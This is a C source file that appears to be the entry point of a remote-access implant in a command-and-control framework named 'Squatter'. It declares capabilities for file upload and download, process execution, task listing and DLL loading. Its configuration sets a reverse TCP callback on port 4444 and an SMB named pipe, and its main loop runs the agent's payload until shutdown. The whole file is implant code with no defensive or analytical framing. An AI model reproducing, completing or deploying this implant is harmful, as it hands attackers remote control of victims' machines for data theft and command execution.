#include "sq_manager.h"

__attribute__((used, section(".squat")))
const struct squatter_build_info squatter_build_info = {
    {'S', 'Q', 'U', 'A', 'T', '0', '0', '1'},
    SQUATTER_VERSION,
    SQUATTER_CAP_FILE_GET |
        SQUATTER_CAP_FILE_PUT |
        SQUATTER_CAP_PROCESS_EXEC |
        SQUATTER_CAP_PROCESS_TASKLIST |
        SQUATTER_CAP_LIBRARY_RUNDLL,
    SQUATTER_TRANSPORT_REVERSE_TCP |
        SQUATTER_TRANSPORT_SMB_NAMED_PIPE,
};

__attribute__((used, section(".squat")))
const struct sq_transport_config squatter_transport_config = {
    {'S', 'Q', 'C', 'F', 'G', '0', '0', '1'},
    SQ_TRANSPORT_KIND_AUTO,
    {127u, 0u, 0u, 1u},
    4444u,
    {
        L'\\', L'\\', L'.', L'\\', L'p', L'i', L'p', L'e',
        L'\\', L's', L'q', L'u', L'a', L't', L't', L'e',
        L'r', L'\0',
    },
};

static volatile struct squatter_state squatter_state;
static struct sq_manager squatter_manager;

void squatter_entry(void) {
    (void)SquatterAgentInitialize(&squatter_state);
    (void)SquatterAgentRunBasicPayload(
        &squatter_state,
        &squatter_manager,
        &squatter_transport_config);
    for (;;) {
        (void)SquatterAgentTick(&squatter_state);
        if (squatter_state.shutdown != 0) {
            break;
        }
    }
    for (;;) {
    }
}
